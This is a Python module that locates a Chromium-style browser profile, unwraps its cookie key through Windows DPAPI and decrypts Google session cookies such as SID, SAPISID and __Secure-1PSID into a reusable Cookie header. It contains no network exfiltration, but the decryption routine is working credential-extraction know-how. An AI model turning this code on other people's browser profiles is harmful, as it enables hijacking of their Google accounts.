
import os
import json
import sqlite3
import shutil
import tempfile
import base64
import ctypes
import ctypes.wintypes
import logging
from pathlib import Path
from typing import Dict, List, Optional

logger = logging.getLogger("AntigravityAuditor")

PRIMARY_AUTH_COOKIES = [
    "SAPISID",
    "SID",
    "__Secure-1PSID",
    "__Secure-3PSID",
    "SSID",
    "HSID",
    "APISID",
    "__Secure-1PAPISID",
    "__Secure-3PAPISID",
    "SIDCC",
    "__Secure-1PSIDCC",
    "__Secure-3PSIDCC",
    "__Secure-1PSIDTS",
    "__Secure-3PSIDTS",
    "LSID",
    "OSID",
]


class _DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_char)),
    ]


def _dpapi_decrypt(encrypted: bytes) -> bytes:
    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = _DATA_BLOB(ctypes.sizeof(p), p)
    blobout = _DATA_BLOB()

    success = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin),
        None,
        None,
        None,
        None,
        0,
        ctypes.byref(blobout),
    )
    if not success:
        raise RuntimeError(
            f"CryptUnprotectData failed with error code: {ctypes.GetLastError()}"
        )

    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> bytes:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext_with_tag, None)


class ProfileCookieExtractor:

    def __init__(self, profile_dir: Path):
        self.profile_dir = Path(profile_dir)
        self._aes_key: Optional[bytes] = None


    def _get_aes_key(self) -> Optional[bytes]:
        if self._aes_key is not None:
            return self._aes_key

        local_state_path = self.profile_dir / "Local State"
        if not local_state_path.exists():
            logger.debug(f"[ProfileExtractor] Local State not found: {local_state_path}")
            return None

        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)

            encrypted_key_b64: str = (
                local_state.get("os_crypt", {}).get("encrypted_key", "")
            )
            if not encrypted_key_b64:
                logger.debug("[ProfileExtractor] No os_crypt.encrypted_key in Local State")
                return None

            encrypted_key = base64.b64decode(encrypted_key_b64)
            if encrypted_key[:5] == b"DPAPI":
                encrypted_key = encrypted_key[5:]

            aes_key = _dpapi_decrypt(encrypted_key)
            self._aes_key = aes_key
            logger.debug(f"[ProfileExtractor] AES key decrypted ({len(aes_key)} bytes)")
            return aes_key

        except Exception as e:
            logger.debug(f"[ProfileExtractor] Failed to get AES key: {e}")
            return None


    @staticmethod
    def _decode_cookie_bytes(decrypted: bytes) -> str:
        if not decrypted:
            return ""

        if len(decrypted) > 32 and not all(32 <= b <= 126 for b in decrypted[:32]):
            try:
                return decrypted[32:].decode("utf-8")
            except UnicodeDecodeError:
                pass

        try:
            return decrypted.decode("utf-8")
        except UnicodeDecodeError:
            pass

        if len(decrypted) > 32:
            try:
                return decrypted[32:].decode("utf-8", errors="ignore")
            except Exception:
                pass

        return ""

    def _decrypt_value(self, encrypted_value: bytes, aes_key: bytes) -> str:
        if not encrypted_value:
            return ""

        try:
            prefix = encrypted_value[:3]

            if prefix in (b"v10", b"v11"):
                nonce = encrypted_value[3:15]
                ciphertext_tag = encrypted_value[15:]
                decrypted = _aes_gcm_decrypt(aes_key, nonce, ciphertext_tag)
                return self._decode_cookie_bytes(decrypted)
            else:
                decrypted = _dpapi_decrypt(encrypted_value)
                return self._decode_cookie_bytes(decrypted)

        except Exception as e:
            logger.debug(f"[ProfileExtractor] Cookie decryption failed: {e}")
            return ""


    def extract_cookies(self) -> Optional[Dict[str, str]]:
        cookies_db = self.profile_dir / "Default" / "Network" / "Cookies"
        if not cookies_db.exists():
            logger.debug(f"[ProfileExtractor] Cookies DB not found: {cookies_db}")
            return None

        aes_key = self._get_aes_key()
        if not aes_key:
            return None

        tmp_path: Optional[str] = None
        try:
            with tempfile.NamedTemporaryFile(suffix="_cookies.db", delete=False) as tmp:
                tmp_path = tmp.name
            shutil.copy2(str(cookies_db), tmp_path)

            cookie_dict: Dict[str, str] = {}

            conn = sqlite3.connect(f"file:{tmp_path}?mode=ro", uri=True)
            conn.row_factory = sqlite3.Row
            try:
                rows = conn.execute(
                    """
                    SELECT name, encrypted_value, host_key, expires_utc
                    FROM cookies
                    WHERE (host_key LIKE '%google.com%'
                       OR  host_key LIKE '%antigravity%')
                    ORDER BY
                        CASE
                            WHEN host_key = '.google.com' THEN 0
                            WHEN host_key LIKE '%.google.com' THEN 1
                            ELSE 2
                        END ASC,
                        expires_utc DESC
                    """
                ).fetchall()
            finally:
                conn.close()

            for row in rows:
                name: str = row["name"]
                encrypted_value: bytes = bytes(row["encrypted_value"])

                if not name or not encrypted_value:
                    continue
                if name in cookie_dict:
                    continue

                value = self._decrypt_value(encrypted_value, aes_key)
                if value:
                    cookie_dict[name] = value

            if not cookie_dict:
                logger.debug("[ProfileExtractor] No decryptable Google cookies in profile")
                return None

            if not (cookie_dict.get("SAPISID") or cookie_dict.get("SID")):
                logger.debug(
                    "[ProfileExtractor] Cookies found but no SAPISID/SID — session not valid"
                )
                return None

            logger.debug(
                f"[ProfileExtractor] Decrypted {len(cookie_dict)} cookies "
                f"({', '.join(k for k in PRIMARY_AUTH_COOKIES if k in cookie_dict)})"
            )
            return cookie_dict

        except Exception as e:
            logger.debug(f"[ProfileExtractor] SQLite extraction error: {e}")
            return None
        finally:
            if tmp_path and os.path.exists(tmp_path):
                try:
                    os.unlink(tmp_path)
                except Exception:
                    pass

    def build_cookie_header(self, cookie_dict: Dict[str, str]) -> str:
        return "; ".join(f"{k}={v}" for k, v in cookie_dict.items())
